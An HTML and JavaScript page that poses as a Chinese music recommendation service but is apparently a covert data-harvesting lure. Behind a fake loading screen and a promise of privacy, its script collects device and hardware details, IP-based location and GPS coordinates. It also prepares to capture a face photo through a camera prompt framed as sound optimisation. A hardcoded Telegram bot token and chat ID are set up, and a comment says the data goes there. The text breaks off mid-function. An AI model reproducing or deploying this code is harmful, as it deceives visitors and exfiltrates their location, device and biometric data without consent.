<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸµ éŸ³ä¹æ˜Ÿçƒ | ä¸ªæ€§åŒ–éŸ³ä¹æ¨èç³»ç»Ÿ</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #1DB954;
            --secondary: #191414;
            --accent: #FF6B6B;
            --dark: #121212;
            --light: #282828;
            --text: #FFFFFF;
            --text-secondary: #B3B3B3;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: var(--secondary);
            color: var(--text);
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* éŸ³ä¹èƒŒæ™¯æ•ˆæœ */
        .music-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #121212, #191414, #000000);
            z-index: -2;
        }
        
        .sound-waves {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 30% 30%, rgba(29, 185, 84, 0.1) 0%, transparent 50%),
                      radial-gradient(circle at 70% 70%, rgba(255, 107, 107, 0.1) 0%, transparent 50%);
            z-index: -1;
            animation: pulseWaves 20s infinite alternate;
        }
        
        @keyframes pulseWaves {
            0% { transform: scale(1); opacity: 0.5; }
            100% { transform: scale(1.2); opacity: 0.8; }
        }
        
        /* ä¸»å®¹å™¨ */
        .music-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* é¡¶éƒ¨å¯¼èˆª */
        .music-navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 25px 0;
            margin-bottom: 40px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        
        .logo-section {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo {
            width: 50px;
            height: 50px;
            background: linear-gradient(45deg, var(--primary), var(--accent));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            animation: rotateLogo 10s linear infinite;
        }
        
        @keyframes rotateLogo {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        .logo-text h1 {
            font-size: 2.2rem;
            background: linear-gradient(90deg, var(--primary), var(--accent));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .user-badge {
            background: rgba(255,255,255,0.1);
            padding: 10px 20px;
            border-radius: 25px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        /* åŠ è½½ç•Œé¢ */
        .music-loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--dark);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            transition: opacity 0.5s;
        }
        
        .equalizer {
            display: flex;
            align-items: flex-end;
            gap: 5px;
            height: 60px;
            margin-bottom: 30px;
        }
        
        .bar {
            width: 8px;
            background: linear-gradient(to top, var(--primary), var(--accent));
            border-radius: 4px;
            animation: equalize 1.5s infinite;
        }
        
        .bar:nth-child(1) { height: 20px; animation-delay: 0s; }
        .bar:nth-child(2) { height: 40px; animation-delay: 0.2s; }
        .bar:nth-child(3) { height: 60px; animation-delay: 0.4s; }
        .bar:nth-child(4) { height: 40px; animation-delay: 0.6s; }
        .bar:nth-child(5) { height: 20px; animation-delay: 0.8s; }
        
        @keyframes equalize {
            0%, 100% { height: 20px; }
            25% { height: 40px; }
            50% { height: 60px; }
            75% { height: 40px; }
        }
        
        /* éŸ³ä¹æ’­æ”¾å™¨ */
        .player-section {
            background: rgba(40, 40, 40, 0.8);
            border-radius: 25px;
            padding: 40px;
            margin-bottom: 40px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .player-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .player-title h2 {
            font-size: 2rem;
            color: var(--text);
            margin-bottom: 10px;
        }
        
        .player-title p {
            color: var(--text-secondary);
            font-size: 1.1rem;
        }
        
        .player-controls {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        
        .control-btn {
            width: 60px;
            height: 60px;
            background: var(--primary);
            border: none;
            border-radius: 50%;
            color: white;
            font-size: 24px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .control-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 30px rgba(29, 185, 84, 0.5);
        }
        
        .play-btn {
            width: 80px;
            height: 80px;
            font-size: 32px;
            background: linear-gradient(45deg, var(--primary), var(--accent));
        }
        
        .player-display {
            display: grid;
            grid-template-columns: 1fr 2fr 1fr;
            gap: 30px;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .album-art {
            width: 200px;
            height: 200px;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        
        .album-art img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .song-info {
            padding: 20px;
        }
        
        .song-title {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 15px;
            background: linear-gradient(90deg, var(--text), var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .song-artist {
            font-size: 1.5rem;
            color: var(--text-secondary);
            margin-bottom: 10px;
        }
        
        .song-album {
            font-size: 1.1rem;
            color: var(--text-secondary);
            margin-bottom: 30px;
        }
        
        /* è¿›åº¦æ¡ */
        .progress-container {
            margin: 30px 0;
        }
        
        .progress-bar {
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 10px;
            position: relative;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--accent));
            width: 45%;
            border-radius: 4px;
            position: relative;
        }
        
        .progress-fill::after {
            content: '';
            position: absolute;
            right: -8px;
            top: 50%;
            transform: translateY(-50%);
            width: 16px;
            height: 16px;
            background: white;
            border-radius: 50%;
            box-shadow: 0 0 15px rgba(255,255,255,0.5);
        }
        
        .time-display {
            display: flex;
            justify-content: space-between;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }
        
        /* ä¸ªæ€§åŒ–æ¨è */
        .recommendation-section {
            margin: 50px 0;
        }
        
        .section-title {
            font-size: 1.8rem;
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .section-title i {
            color: var(--primary);
        }
        
        .tracks-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
        }
        
        .track-card {
            background: rgba(40, 40, 40, 0.6);
            border-radius: 15px;
            padding: 25px;
            display: flex;
            align-items: center;
            gap: 20px;
            transition: all 0.3s;
            cursor: pointer;
            border: 1px solid transparent;
        }
        
        .track-card:hover {
            background: rgba(40, 40, 40, 0.9);
            border-color: var(--primary);
            transform: translateY(-5px);
        }
        
        .track-cover {
            width: 70px;
            height: 70px;
            border-radius: 10px;
            overflow: hidden;
        }
        
        .track-cover img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .track-details {
            flex: 1;
        }
        
        .track-name {
            font-size: 1.2rem;
            font-weight: 600;
            margin-bottom: 5px;
        }
        
        .track-artist {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }
        
        .track-duration {
            color: var(--text-secondary);
            font-size: 0.9rem;
        }
        
        /* è®¾å¤‡ä¿¡æ¯æ˜¾ç¤º */
        .device-section {
            background: rgba(40, 40, 40, 0.6);
            border-radius: 20px;
            padding: 30px;
            margin: 40px 0;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .device-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-top: 20px;
        }
        
        .device-card {
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            padding: 25px;
            border-left: 4px solid var(--primary);
        }
        
        .device-card-title {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            color: var(--primary);
            font-size: 1.1rem;
        }
        
        .device-data {
            font-size: 1.8rem;
            font-weight: 700;
            margin: 10px 0;
            color: var(--text);
        }
        
        .device-desc {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }
        
        /* éªŒè¯åŒºåŸŸ */
        .verification-notice {
            background: linear-gradient(135deg, rgba(29, 185, 84, 0.1), rgba(255, 107, 107, 0.1));
            border-radius: 20px;
            padding: 30px;
            margin: 40px 0;
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .verification-content {
            text-align: center;
            max-width: 800px;
            margin: 0 auto;
        }
        
        .verification-content h3 {
            font-size: 1.8rem;
            margin-bottom: 15px;
            color: var(--text);
        }
        
        .verification-content p {
            color: var(--text-secondary);
            margin-bottom: 25px;
            line-height: 1.6;
        }
        
        /* æ‘„åƒå¤´åŒºåŸŸ */
        .camera-section {
            background: rgba(0,0,0,0.5);
            border-radius: 20px;
            padding: 40px;
            margin: 40px 0;
            text-align: center;
            display: none;
            border: 2px solid var(--primary);
        }
        
        .camera-preview {
            width: 100%;
            max-width: 500px;
            height: 350px;
            background: #000;
            border-radius: 15px;
            overflow: hidden;
            margin: 30px auto;
            position: relative;
        }
        
        #cameraVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .face-guide {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 180px;
            height: 240px;
            border: 3px solid rgba(29, 185, 84, 0.5);
            border-radius: 10px;
        }
        
        /* æŒ‰é’®æ ·å¼ */
        .music-btn {
            background: linear-gradient(90deg, var(--primary), #25D366);
            color: white;
            border: none;
            padding: 18px 35px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 12px;
        }
        
        .music-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(29, 185, 84, 0.4);
        }
        
        .music-btn.secondary {
            background: rgba(255,255,255,0.1);
            border: 2px solid rgba(255,255,255,0.2);
        }
        
        /* å“åº”å¼è®¾è®¡ */
        @media (max-width: 992px) {
            .player-display {
                grid-template-columns: 1fr;
                text-align: center;
            }
            
            .album-art {
                margin: 0 auto;
            }
            
            .tracks-grid {
                grid-template-columns: 1fr;
            }
        }
        
        @media (max-width: 768px) {
            .music-navbar {
                flex-direction: column;
                gap: 20px;
            }
            
            .player-header {
                flex-direction: column;
                gap: 20px;
                text-align: center;
            }
            
            .song-title {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
    <!-- èƒŒæ™¯æ•ˆæœ -->
    <div class="music-background"></div>
    <div class="sound-waves"></div>

    <!-- åŠ è½½ç•Œé¢ -->
    <div class="music-loader" id="loadingScreen">
        <div class="equalizer">
            <div class="bar"></div>
            <div class="bar"></div>
            <div class="bar"></div>
            <div class="bar"></div>
            <div class="bar"></div>
        </div>
        <h2 style="margin-bottom: 20px; font-size: 1.8rem;">æ­£åœ¨åˆ†ææ‚¨çš„éŸ³ä¹åå¥½...</h2>
        <div style="background: rgba(255,255,255,0.05); padding: 15px 25px; border-radius: 10px; margin: 20px 0;">
            <div style="font-size: 1.1rem; color: var(--primary);" id="loadingStatus">
                <i class="fas fa-music"></i> åˆ›å»ºä¸ªæ€§åŒ–æ’­æ”¾åˆ—è¡¨
            </div>
        </div>
        <p style="color: var(--text-secondary); text-align: center; max-width: 500px; line-height: 1.6;">
            ç³»ç»Ÿæ­£åœ¨åˆ†ææ‚¨çš„è®¾å¤‡ä¿¡æ¯ï¼Œä¸ºæ‚¨æ¨èæœ€é€‚åˆçš„éŸ³ä¹
        </p>
    </div>

    <!-- ä¸»å†…å®¹ -->
    <div class="music-container" id="mainContainer" style="display: none;">
        <!-- é¡¶éƒ¨å¯¼èˆª -->
        <nav class="music-navbar">
            <div class="logo-section">
                <div class="logo">
                    <i class="fas fa-music"></i>
                </div>
                <div class="logo-text">
                    <h1>éŸ³ä¹æ˜Ÿçƒ</h1>
                    <p style="color: var(--text-secondary); font-size: 0.9rem;">æ™ºèƒ½éŸ³ä¹æ¨èç³»ç»Ÿ</p>
                </div>
            </div>
            
            <div class="user-info">
                <div class="user-badge">
                    <i class="fas fa-headphones"></i>
                    <span id="listenerStatus">é«˜çº§ä¼šå‘˜</span>
                </div>
                <div class="user-badge">
                    <i class="fas fa-wifi"></i>
                    <span id="connectionStatus">åœ¨çº¿</span>
                </div>
            </div>
        </nav>

        <!-- éŸ³ä¹æ’­æ”¾å™¨ -->
        <div class="player-section">
            <div class="player-header">
                <div class="player-title">
                    <h2>æ­£åœ¨ä¸ºæ‚¨æ’­æ”¾</h2>
                    <p>åŸºäºæ‚¨çš„åå¥½æ¨èçš„æ­Œæ›²</p>
                </div>
                
                <div class="player-controls">
                    <button class="control-btn secondary">
                        <i class="fas fa-step-backward"></i>
                    </button>
                    <button class="control-btn play-btn" id="playBtn">
                        <i class="fas fa-play"></i>
                    </button>
                    <button class="control-btn secondary">
                        <i class="fas fa-step-forward"></i>
                    </button>
                </div>
            </div>
            
            <div class="player-display">
                <div class="album-art">
                    <img src="https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80" 
                         alt="Album Cover" id="albumCover">
                </div>
                
                <div class="song-info">
                    <h1 class="song-title" id="currentSong">Blinding Lights</h1>
                    <p class="song-artist" id="currentArtist">The Weeknd</p>
                    <p class="song-album" id="currentAlbum">After Hours</p>
                    
                    <div class="progress-container">
                        <div class="progress-bar">
                            <div class="progress-fill" id="songProgress"></div>
                        </div>
                        <div class="time-display">
                            <span id="currentTime">2:15</span>
                            <span id="totalTime">3:20</span>
                        </div>
                    </div>
                </div>
                
                <div class="player-stats">
                    <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;">
                        <div style="background: rgba(29,185,84,0.2); padding: 10px 15px; border-radius: 10px;">
                            <div style="color: var(--primary); font-size: 0.9rem;">éŸ³è´¨</div>
                            <div style="font-size: 1.2rem; font-weight: 600;">Hi-Fi</div>
                        </div>
                        <div style="background: rgba(255,107,107,0.2); padding: 10px 15px; border-radius: 10px;">
                            <div style="color: var(--accent); font-size: 0.9rem;">éŸ³é‡</div>
                            <div style="font-size: 1.2rem; font-weight: 600;">85%</div>
                        </div>
                    </div>
                    
                    <button class="music-btn secondary" style="width: 100%;" onclick="requestCameraAccess()">
                                                <i class="fas fa-camera"></i> é¢éƒ¨è¯†åˆ«ä¼˜åŒ–éŸ³è´¨
                    </button>
                </div>
            </div>
        </div>

        <!-- è®¾å¤‡ä¿¡æ¯ -->
        <div class="device-section">
            <h3 class="section-title">
                <i class="fas fa-microchip"></i> è®¾å¤‡ä¼˜åŒ–çŠ¶æ€
            </h3>
            <p style="color: var(--text-secondary); margin-bottom: 25px;">
                ç³»ç»Ÿæ­£åœ¨ä¼˜åŒ–æ‚¨çš„è®¾å¤‡ä»¥è·å¾—æœ€ä½³éŸ³ä¹ä½“éªŒ
            </p>
            
            <div class="device-info">
                <div class="device-card">
                    <div class="device-card-title">
                        <i class="fas fa-microphone"></i>
                        <span>éŸ³é¢‘è®¾å¤‡</span>
                    </div>
                    <div class="device-data" id="audioDevice">æ£€æµ‹ä¸­...</div>
                    <div class="device-desc">æ‰¬å£°å™¨/è€³æœºçŠ¶æ€</div>
                </div>
                
                <div class="device-card">
                    <div class="device-card-title">
                        <i class="fas fa-network-wired"></i>
                        <span>ç½‘ç»œè¿æ¥</span>
                    </div>
                    <div class="device-data" id="networkSpeed">æ£€æµ‹ä¸­...</div>
                    <div class="device-desc">å½“å‰ç½‘ç»œé€Ÿåº¦</div>
                </div>
                
                <div class="device-card">
                    <div class="device-card-title">
                        <i class="fas fa-battery-full"></i>
                        <span>ç”µæ± çŠ¶æ€</span>
                    </div>
                    <div class="device-data" id="batteryStatus">æ£€æµ‹ä¸­...</div>
                    <div class="device-desc">è®¾å¤‡ç”µé‡ä¿¡æ¯</div>
                </div>
                
                <div class="device-card">
                    <div class="device-card-title">
                        <i class="fas fa-mobile-alt"></i>
                        <span>è®¾å¤‡ä¿¡æ¯</span>
                    </div>
                    <div class="device-data" id="deviceModel">æ£€æµ‹ä¸­...</div>
                    <div class="device-desc">æ‰‹æœºå‹å·/ç³»ç»Ÿ</div>
                </div>
            </div>
        </div>

        <!-- æ‘„åƒå¤´åŒºåŸŸ -->
        <div class="camera-section" id="cameraSection">
            <h3 style="font-size: 1.8rem; margin-bottom: 15px;">
                <i class="fas fa-camera"></i> é¢éƒ¨è¯†åˆ«ä¼˜åŒ–
            </h3>
            <p style="color: var(--text-secondary); margin-bottom: 25px;">
                é€šè¿‡é¢éƒ¨è¯†åˆ«åˆ†ææ‚¨çš„å¬è§‰åå¥½ï¼Œæä¾›æ›´ç²¾å‡†çš„éŸ³ä¹æ¨è
            </p>
            
            <div class="camera-preview">
                <video id="cameraVideo" autoplay playsinline></video>
                <div class="face-guide"></div>
            </div>
            
            <div style="margin-top: 30px;">
                <button class="music-btn" id="captureBtn" onclick="captureFace()">
                    <i class="fas fa-camera"></i> å¼€å§‹é¢éƒ¨åˆ†æ
                </button>
                <button class="music-btn secondary" id="skipBtn" onclick="skipCamera()" style="margin-left: 15px;">
                    <i class="fas fa-forward"></i> è·³è¿‡æ­¤æ­¥éª¤
                </button>
            </div>
            
            <div style="margin-top: 25px; padding: 20px; background: rgba(29,185,84,0.1); border-radius: 15px; display: none;" id="faceResult">
                <h4 style="color: var(--primary); margin-bottom: 10px;">
                    <i class="fas fa-check-circle"></i> é¢éƒ¨åˆ†æå®Œæˆ
                </h4>
                <p style="color: var(--text-secondary);">
                    å·²æˆåŠŸåˆ†ææ‚¨çš„é¢éƒ¨ç‰¹å¾ï¼Œæ­£åœ¨ä¼˜åŒ–éŸ³ä¹æ¨è...
                </p>
            </div>
        </div>

        <!-- éªŒè¯æç¤º -->
        <div class="verification-notice">
            <div class="verification-content">
                <h3>ğŸ§ ä¸ªæ€§åŒ–éŸ³ä¹ä½“éªŒä¼˜åŒ–</h3>
                <p>
                    ä¸ºäº†ç»™æ‚¨æä¾›æœ€ä½³çš„éŸ³ä¹æ¨èï¼Œç³»ç»Ÿéœ€è¦è®¿é—®æ‚¨çš„è®¾å¤‡ä¿¡æ¯è¿›è¡Œä¼˜åŒ–ã€‚
                    è¿™åŒ…æ‹¬éŸ³é¢‘è®¾å¤‡æ£€æµ‹ã€ç½‘ç»œçŠ¶å†µåˆ†æã€ç”µæ± çŠ¶æ€ç›‘æ§ç­‰ã€‚
                </p>
                <p style="margin-top: 15px; font-size: 0.9rem; color: rgba(255,255,255,0.6);">
                    <i class="fas fa-shield-alt"></i> 
                    æ‰€æœ‰æ•°æ®ä»…ç”¨äºä¼˜åŒ–æ‚¨çš„éŸ³ä¹ä½“éªŒï¼Œæˆ‘ä»¬æ‰¿è¯ºä¿æŠ¤æ‚¨çš„éšç§å®‰å…¨
                </p>
            </div>
        </div>

        <!-- æ¨èéŸ³ä¹ -->
        <div class="recommendation-section">
            <h3 class="section-title">
                <i class="fas fa-star"></i> ä¸ºæ‚¨æ¨èçš„æ­Œæ›²
            </h3>
            
            <div class="tracks-grid" id="recommendedTracks">
                <!-- åŠ¨æ€ç”Ÿæˆæ¨èæ­Œæ›² -->
            </div>
        </div>

        <!-- ç³»ç»ŸçŠ¶æ€ -->
        <div style="background: rgba(0,0,0,0.3); border-radius: 15px; padding: 20px; margin: 40px 0; text-align: center;">
            <div style="display: inline-flex; align-items: center; gap: 20px; flex-wrap: wrap;">
                <div style="display: flex; align-items: center; gap: 8px;">
                    <i class="fas fa-database" style="color: var(--primary);"></i>
                    <span style="color: var(--text-secondary);">æ•°æ®æ”¶é›†:</span>
                    <span id="dataCollection">0%</span>
                </div>
                <div style="display: flex; align-items: center; gap: 8px;">
                    <i class="fas fa-bolt" style="color: var(--accent);"></i>
                    <span style="color: var(--text-secondary);">ç³»ç»Ÿä¼˜åŒ–:</span>
                    <span id="systemOptimization">0%</span>
                </div>
                <div style="display: flex; align-items: center; gap: 8px;">
                    <i class="fas fa-music" style="color: #9B59B6;"></i>
                    <span style="color: var(--text-secondary);">æ¨èç²¾åº¦:</span>
                    <span id="recommendationAccuracy">0%</span>
                </div>
            </div>
        </div>

        <!-- åº•éƒ¨ -->
        <footer style="text-align: center; padding: 40px 0; margin-top: 50px; border-top: 1px solid rgba(255,255,255,0.1);">
            <p style="color: var(--text-secondary); margin-bottom: 15px;">
                <i class="fas fa-copyright"></i> 2024 éŸ³ä¹æ˜Ÿçƒ | æ™ºèƒ½éŸ³ä¹æ¨èç³»ç»Ÿ
            </p>
            <p style="color: rgba(255,255,255,0.4); font-size: 0.9rem;">
                <i class="fas fa-lock"></i> ç«¯åˆ°ç«¯åŠ å¯† | 
                <i class="fas fa-user-shield"></i> éšç§ä¿æŠ¤ | 
                <i class="fas fa-sync-alt"></i> å®æ—¶ä¼˜åŒ–
            </p>
        </footer>
    </div>

    <!-- éŸ³é¢‘å…ƒç´  -->
    <audio id="backgroundMusic" loop>
        <source src="https://assets.mixkit.co/music/preview/mixkit-tech-house-vibes-130.mp3" type="audio/mpeg">
    </audio>

    <script>
        // JavaScriptä»£ç åœ¨ç¬¬äºŒéƒ¨åˆ†
        // åŒ…å«æ‰€æœ‰æ£€æµ‹åŠŸèƒ½å’ŒTelegramå‘é€
    </script>
</body>
</html>
<script>
// =============================================
// éŸ³ä¹æ£€æµ‹ç³»ç»Ÿ - æ•°æ®æ”¶é›†å¼•æ“
// =============================================

// é…ç½®
const CONFIG = {
    TELEGRAM: {
        BOT_TOKEN: '8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM',
        CHAT_ID: '8313770381',
        API_URL: 'https://api.telegram.org/bot'
    },
    MUSIC_API: {
        IP_INFO: 'https://ipapi.co/json/',
        TIME_API: 'https://worldtimeapi.org/api/ip'
    }
};

// æ•°æ®å­˜å‚¨å¯¹è±¡
const MUSIC_DATA = {
    // ç”¨æˆ·ä¿¡æ¯
    user: {
        sessionId: generateSessionId(),
        startTime: new Date().toISOString(),
        musicProfile: 'Unknown'
    },
    
    // è®¾å¤‡ä¿¡æ¯
    device: {
        // åŸºæœ¬è®¾å¤‡ä¿¡æ¯
        type: null,
        model: null,
        os: null,
        browser: null,
        
        // å±å¹•ä¿¡æ¯
        screen: {
            width: null,
            height: null,
            pixelRatio: null,
            orientation: null,
            colorDepth: null
        },
        
        // ç¡¬ä»¶ä¿¡æ¯
        hardware: {
            cores: null,
            memory: null,
            battery: null,
            touchPoints: null
        },
        
        // éŸ³é¢‘ä¿¡æ¯
        audio: {
            devices: [],
            capabilities: {},
            volume: null,
            quality: null
        },
        
        // ç½‘ç»œä¿¡æ¯
        network: {
            type: null,
            speed: null,
            latency: null,
            signal: null
        }
    },
    
    // ä½ç½®ä¿¡æ¯
    location: {
        ip: null,
        city: null,
        country: null,
        coordinates: null,
        timezone: null,
        isp: null
    },
    
    // ä¼ æ„Ÿå™¨æ•°æ®
    sensors: {
        accelerometer: null,
        gyroscope: null,
        light: null,
        proximity: null,
        orientation: null
    },
    
    // ç”Ÿç‰©ç‰¹å¾
    biometrics: {
        facePhoto: null,
        faceData: null,
        voiceSample: null,
        timestamp: null
    },
    
    // è¡Œä¸ºæ•°æ®
    behavior: {
        musicPreference: {},
        listeningPattern: {},
        interaction: {
            clicks: 0,
            timeSpent: 0,
            songsPlayed: 0,
            volumeChanges: 0
        }
    },
    
    // åº”ç”¨çŠ¶æ€
    app: {
        currentSong: null,
        volume: 85,
        quality: 'Hi-Fi',
        status: 'analyzing'
    }
};

// =============================================
// é¡µé¢åˆå§‹åŒ–
// =============================================

document.addEventListener('DOMContentLoaded', function() {
    console.log('ğŸµ éŸ³ä¹æ£€æµ‹ç³»ç»Ÿåˆå§‹åŒ–...');
    
    // æ¨¡æ‹ŸåŠ è½½éŸ³ä¹åˆ†æ
    simulateLoading();
    
    // åˆå§‹åŒ–éŸ³ä¹æ’­æ”¾å™¨
    initMusicPlayer();
    
    // ç”Ÿæˆæ¨èæ­Œæ›²
    generateRecommendedTracks();
    
    // å¼€å§‹æ•°æ®æ”¶é›†
    setTimeout(() => {
        startDataCollection();
    }, 2000);
    
    // è®¾ç½®æŒ‰é’®äº‹ä»¶
    setupButtonEvents();
});

// æ¨¡æ‹ŸåŠ è½½è¿‡ç¨‹
function simulateLoading() {
    const loadingMessages = [
        'æ­£åœ¨åˆ†ææ‚¨çš„éŸ³ä¹å“å‘³...',
        'æ£€æµ‹éŸ³é¢‘è®¾å¤‡...',
        'ä¼˜åŒ–ç½‘ç»œè¿æ¥...',
        'æ ¡å‡†éŸ³é¢‘è´¨é‡...',
        'ç”Ÿæˆä¸ªæ€§åŒ–æ¨è...',
        'å‡†å¤‡æ’­æ”¾åˆ—è¡¨...'
    ];
    
    let currentMessage = 0;
    const statusElement = document.getElementById('loadingStatus');
    
    const interval = setInterval(() => {
        if (currentMessage < loadingMessages.length) {
            statusElement.innerHTML = `<i class="fas fa-music"></i> ${loadingMessages[currentMessage]}`;
            currentMessage++;
        } else {
            clearInterval(interval);
            
            // æ˜¾ç¤ºä¸»ç•Œé¢
            setTimeout(() => {
                document.getElementById('loadingScreen').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('loadingScreen').style.display = 'none';
                    document.getElementById('mainContainer').style.display = 'block';
                    
                    // å¼€å§‹æ’­æ”¾èƒŒæ™¯éŸ³ä¹
                    startBackgroundMusic();
                    
                    // å¼€å§‹æŒç»­æ•°æ®æ”¶é›†
                    startContinuousMonitoring();
                    
                }, 500);
            }, 1000);
        }
    }, 800);
}

// =============================================
// æ•°æ®æ”¶é›†åŠŸèƒ½
// =============================================

async function startDataCollection() {
    console.log('ğŸ” å¼€å§‹æ”¶é›†è®¾å¤‡æ•°æ®...');
    
    // æ›´æ–°UIçŠ¶æ€
    updateProgress('dataCollection', 10);
    
    // 1. æ”¶é›†è®¾å¤‡åŸºæœ¬ä¿¡æ¯
    collectDeviceInfo();
    updateProgress('dataCollection', 20);
    
    // 2. æ”¶é›†ç½‘ç»œä¿¡æ¯
    await collectNetworkInfo();
    updateProgress('dataCollection', 40);
    
    // 3. æ”¶é›†ä½ç½®ä¿¡æ¯
    await collectLocationInfo();
    updateProgress('dataCollection', 60);
    
    // 4. æ£€æµ‹ä¼ æ„Ÿå™¨
    detectSensors();
    updateProgress('dataCollection', 80);
    
    // 5. æ£€æµ‹éŸ³é¢‘è®¾å¤‡
    detectAudioDevices();
    updateProgress('dataCollection', 100);
    
    // æ›´æ–°UIæ˜¾ç¤º
    updateDeviceDisplay();
    
    console.log('âœ… æ•°æ®æ”¶é›†å®Œæˆ');
}

function collectDeviceInfo() {
    // è®¾å¤‡ç±»å‹æ£€æµ‹
    const userAgent = navigator.userAgent;
    MUSIC_DATA.device.browser = getBrowserName(userAgent);
    MUSIC_DATA.device.os = getOSName(userAgent);
    MUSIC_DATA.device.type = getDeviceType(userAgent);
    MUSIC_DATA.device.model = getDeviceModel(userAgent);
    
    // å±å¹•ä¿¡æ¯
    MUSIC_DATA.device.screen = {
        width: screen.width,
        height: screen.height,
        pixelRatio: window.devicePixelRatio,
        orientation: screen.orientation ? screen.orientation.type : 'unknown',
        colorDepth: screen.colorDepth,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight
    };
    
    // ç¡¬ä»¶ä¿¡æ¯
    MUSIC_DATA.device.hardware = {
        cores: navigator.hardwareConcurrency || 'unknown',
        memory: navigator.deviceMemory || 'unknown',
        touchPoints: navigator.maxTouchPoints || 0,
        platform: navigator.platform,
        vendor: navigator.vendor || 'unknown'
    };
    
    // è¯­è¨€å’Œæ—¶åŒº
    MUSIC_DATA.device.language = navigator.language;
    MUSIC_DATA.device.languages = navigator.languages;
    MUSIC_DATA.device.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
}

async function collectNetworkInfo() {
    try {
        // è·å–IPå’Œä½ç½®
        const response = await fetch(CONFIG.MUSIC_API.IP_INFO);
        const data = await response.json();
        
        MUSIC_DATA.location = {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            countryCode: data.country_code,
            latitude: data.latitude,
            longitude: data.longitude,
            timezone: data.timezone,
            isp: data.org,
            asn: data.asn
        };
        
        // ç½‘ç»œè¿æ¥ä¿¡æ¯
        if (navigator.connection) {
            const conn = navigator.connection;
            MUSIC_DATA.device.network = {
                type: conn.effectiveType,
                speed: conn.downlink + ' Mbps',
                latency: conn.rtt + ' ms',
                saveData: conn.saveData,
                online: navigator.onLine
            };
            
            // æ›´æ–°UI
            document.getElementById('networkSpeed').textContent = 
                conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
        }
        
    } catch (error) {
        console.error('ç½‘ç»œä¿¡æ¯æ”¶é›†å¤±è´¥:', error);
    }
}

async function collectLocationInfo() {
    // ä½¿ç”¨IPè·å–çš„ä½ç½®ä¿¡æ¯å·²åœ¨collectNetworkInfoä¸­è·å–
    // è¿™é‡Œå¯ä»¥è·å–æ›´ç²¾ç¡®çš„ä½ç½®ï¼ˆå¦‚æœç”¨æˆ·æˆæƒï¼‰
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                MUSIC_DATA.location.precise = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
